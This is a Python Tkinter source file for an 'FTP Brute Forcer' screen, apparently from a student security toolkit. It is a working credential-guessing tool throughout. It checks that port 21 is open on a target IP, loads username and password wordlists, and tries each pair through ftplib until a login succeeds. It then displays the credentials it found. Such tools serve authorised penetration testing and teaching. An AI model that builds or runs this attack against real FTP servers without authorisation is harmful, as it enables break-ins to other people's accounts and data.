try:
    import os
    import tkinter as tk
    import tkinter.ttk as ttk
    from tkinter import filedialog
except ImportError:
    import Tkinter as tk
    import ttk
    import tkFileDialog as filedialog

import re
import socket
from ftplib import FTP
from os import path
from tkinter import *
from tkinter import font as tkfont
from tkinter import messagebox

from nav_bar import *


class FTPBruteForce(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        # displays navbar at top of app screen
        display_nav_bar(self, controller)
        # sets font for frame
        framefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        # sets font for buttons
        btnfont = tkfont.Font(family='Calibri', size=13)

        # function that opens the file and reads the usernames or passwords into the listboxes
        def open_file(credential):
            # variable rep stores the file path for the file the user selects
            rep = filedialog.askopenfilenames(
                parent=self, initialdir='/', initialfile='tmp', filetypes=[
                    ("All files", "*")])
            # try to read file and populate listbox or throw an error
            try:
                # if the passed parameter is username, and the rep variable is not empty
                if credential == "username" and rep != "":
                    # change the label to the filepath
                    username_filepath.configure(text=rep[1])
                    # open the file, rep is a list, the second object [1] is the proper filepath
                    # not sure what the first object is
                    file = open(rep[1], "r")
                    # loop through all lines in the file and insert into listbox
                    for line in file:
                        usernames_label.insert(END, line)
                # if the passed parameter is password, and the rep variable is not empty
                elif credential == "password" and rep != "":
                    # change the label to the password filepath
                    password_filepath.configure(text=rep[1])
                    file = open(rep[1], "r")
                    for line in file:
                        passwords_label.insert(END, line)
                else:
                    messagebox.showerror('File Selection', 'Something went wrong!')
            except IndexError:
                print("No file selected")

        # extra frame for spacing, pushes all subsequent content below nav bar and title label using the pady field
        frameextra = tk.Label(self, bg='#64C1DA')
        frameextra.pack(pady=78)

        white_canvas = tk.Canvas(self, bg="white")
        white_canvas.place(rely=0.1, relx=0, relheight=0.9, relwidth=1)

        usernames_label = tk.Listbox(self, bg="#E7E7E7", borderwidth=2, relief="solid")
        usernames_label.place(rely=0.2, relx=0.65, relheight=0.4, relwidth=0.35)

        passwords_label = tk.Listbox(self, bg="#E7E7E7", borderwidth=2, relief="solid")
        passwords_label.place(rely=0.598, relx=0.65, relheight=0.402, relwidth=0.35)

        # creates blue bar as canvas below nav bar housing label containing title of page
        title_canvas = tk.Canvas(self, bg='#64C1DA', highlightthickness=0)
        title_canvas.place(rely=0.08, relheight=0.12, relwidth=1)
        title_label = tk.Label(self, text="FTP Brute Forcer", bg='#3B5262', fg='white', anchor="c", font=framefont)
        title_label.place(rely=0.08, relheight=0.12, relwidth=1)

        # global image file that refers to the open file icon
        global openfile_image
        openfile_image = tk.PhotoImage(file='resources/open_ico.png')

        username_title = tk.Label(self, text="Username List File", justify=LEFT, bg="white", anchor='nw',
                                  font=("Calibri", 20, "bold"))
        open_button_username = tk.Button(self, image=openfile_image, bg="#E3E4E5",
                                         command=lambda: open_file("username"))
        username_filepath = tk.Label(self, text="Select file...", justify=LEFT, bg="white", anchor='nw',
                                     font=("Calibri", 14))
        username_input = Text(self, bg="#E4E4E4", font=("Calibri", 10), state="disabled")

        # function defines the functionality that runs when the checkbox is toggled
        def checkbox_click():
            # if checkbox is checked, allow user to write a username and change list to red
            if cb.get() == 1:
                username_input.configure(state="normal")
                username_input.configure(bg="white")
                usernames_label.configure(bg="#DBA2A2")
            # if checkbox is NOT checked, prevent user from writing a username and change list to white/grey
            elif cb.get() == 0:
                username_input.configure(state="disabled")
                username_input.configure(bg="#E4E4E4")
                usernames_label.configure(bg="#E7E7E7")
            else:
                messagebox.showerror('Checkbutton Interaction', 'Something went wrong!')

        # defines cb as an integer variable. This is used to reference the status of the checkbox
        cb = IntVar()

        # defines checkbutton, links the cb variable to the status of the checkbox, sets the onvalue and offvalue as a
        # ...number, this is used in the checkbox_click() function
        specify_username = Checkbutton(self, bg="white", text="Specify username",
                                       variable=cb, onvalue=1, offvalue=0, command=checkbox_click)

        specify_username.place(rely=0.32, relx=0.04, relheight=0.039)
        username_input.place(rely=0.32, relx=0.145, relheight=0.035, relwidth=0.1)
        username_title.place(rely=0.21, relx=0.04)
        open_button_username.place(rely=0.26, relx=0.04)
        username_filepath.place(rely=0.266, relx=0.072)

        password_title = tk.Label(self, text="Password List File", justify=LEFT, bg="white", anchor='nw',
                                  font=("Calibri", 20, "bold"))
        open_button_password = tk.Button(self, image=openfile_image, bg="#E3E4E5",
                                         command=lambda: open_file("password"))
        password_filepath = tk.Label(self, text="Select file...", justify=LEFT, bg="white", anchor='nw',
                                     font=("Calibri", 14))

        password_title.place(rely=0.41, relx=0.04)
        open_button_password.place(rely=0.46, relx=0.04)
        password_filepath.place(rely=0.466, relx=0.072)

        #  this IP validation code is copied from the PortScanner tool which Laiba created, and has been modified
        def validate_ip(input):
            # Determine whether the input IP format is correct (regular)
            reg = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
            ip = re.match(reg, input)
            if ip is not None:
                return True
            else:
                return False

        # function that launches the tool, validates ip, checks if port 21 is open,
        # then brute force passing ip and username(s)
        def launch_tool():
            ip = target_input.get("1.0", 'end-1c')
            results_username.configure(text="Username: ")
            results_password.configure(text="Password: ")

            # function validate_ip() returns true if user input matches regex
            if validate_ip(ip):
                # function check_port() returns true if port is open
                if check_port(ip):
                    username = username_input.get("1.0", 'end-1c')

                    if cb.get() == 1 and username != "":  # specific username
                        check_wordlist(ip, username)

                    elif cb.get() == 0:  # username list
                        check_userlist(ip)

                    else:
                        messagebox.showerror("Username error",
                                             "Please ensure that you have entered a username or selected a file.")
                else:
                    messagebox.showerror("Port closed", "The port 21 is not open! Are you sure that is the FTP server?")
            else:
                messagebox.showerror('Error', 'IP Invalid, Please Enter a Valid IP Address')

        targets_title = tk.Label(self, text="Target", justify=LEFT, bg="white", anchor='nw',
                                 font=("Calibri", 20, "bold"))
        target_input_desc = tk.Label(self, text="Target IP: ", justify=LEFT, bg="white", anchor='nw',
                                     font=("Calibri", 14))
        target_input = Text(self, bg="white", font=("Calibri", 12), state="normal")

        targets_title.place(rely=0.55, relx=0.04)
        target_input_desc.place(rely=0.61, relx=0.04)
        target_input.place(rely=0.606, relx=0.093, relheight=0.035, relwidth=0.1)

        launch_button = tk.Button(self, compound=LEFT, text="LAUNCH", bg='#4D6C84', fg='white',
                                  font=("Calibri", 20, "bold"), command=launch_tool)
        launch_button.place(rely=0.655, relx=0.04, relheight=0.075, relwidth=0.12)

        results_title = tk.Label(self, text="Results", justify=LEFT, bg="white", anchor='nw',
                                 font=("Calibri", 20, "bold"))
        results_username = tk.Label(self, text="Username: ", justify=LEFT, bg="white", anchor='nw',
                                    font=("Calibri", 14))
        results_password = tk.Label(self, text="Password: ", justify=LEFT, bg="white", anchor='nw',
                                    font=("Calibri", 14))

        results_title.place(rely=0.78, relx=0.04)
        results_username.place(rely=0.83, relx=0.04)
        results_password.place(rely=0.865, relx=0.04)

        # function takes a passed ip and attempts to connect,
        # if connection successful return true, otherwise return false
        def check_port(ip):
            try:
                # create socket object
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # assign outcome of connection to port variable
                port = sock.connect_ex((ip, 21))
                # if connection successful, return true
                if port == 0:
                    sock.close
                    return True
                else:
                    sock.close
                    return False

            except socket.gaierror:
                print("Name or service not known")

        # function validates username list path and password list file path
        def check_userlist(ip):
            usr_filepath = username_filepath.cget("text")
            # validates that the supplied username list filepath is actually a file
            if path.isfile(usr_filepath):
                pwd_filepath = password_filepath.cget("text")

                # validates that the supplied password list filepath is actually a file
                if path.isfile(pwd_filepath):
                    # initiates brute force attack
                    brute_force_list(ip, usr_filepath, pwd_filepath)
                else:
                    messagebox.showerror('Error', 'Error loading password list file.')
            else:
                messagebox.showerror('Error', 'Error loading username list file.')

        # function that takes a ip and username and validates password file, then initiates brute force attack
        def check_wordlist(ip, username):
            pwd_filepath = password_filepath.cget("text")
            # validates that the supplied username list filepath is actually a file
            if path.isfile(pwd_filepath):
                # initiates brute force attack
                brute_force(ip, username, pwd_filepath)
            else:
                messagebox.showerror('Error', 'Error loading password list file.')

        # function takes ip, username and password wordlist and tries every password with
        # the username until a match is found
        def brute_force(ip, username, wordlist):
            wordlist = open(wordlist, "r", buffering=25000)
            passwords = wordlist.readlines()

            # loops through every password, since this function runs with only the single username
            for password in passwords:
                password = password.strip()
                # if a connection is successful, it returns true and breaks out of the loop
                if ftpbruter(ip, username, password):
                    break

        # function takes ip, username wordlist and password wordlist and tries every password with
        # every username until a match is found
        def brute_force_list(ip, username, wordlist):
            wordlist = open(wordlist, "r", buffering=25000)
            username = open(username, "r", buffering=25000)
            passwords = wordlist.readlines()
            users = username.readlines()

            # loops through every username in the list
            for user in users:
                user = user.strip()
                # loops through every password in the list
                for password in passwords:
                    password = password.strip()
                    # if a connection is successful, it returns true and breaks out of the loop
                    if ftpbruter(ip, user, password):
                        break

        # function tries to connect using credentials from parameters
        def ftpbruter(ip, username, password):
            try:
                print("Testing: ", username, " and ", password)
                # attempts to connect to FTP using credentials. If it fails it will throw an error, and the rest
                # of the code in the try catch block will not run
                ftp = FTP(ip)
                ftp.login(username, password)
                ftp.quit()
                # updates found credentials in GUI
                results_username.configure(text="Username: " + username)
                results_password.configure(text="Password: " + password)

                return True
            except:
                return False
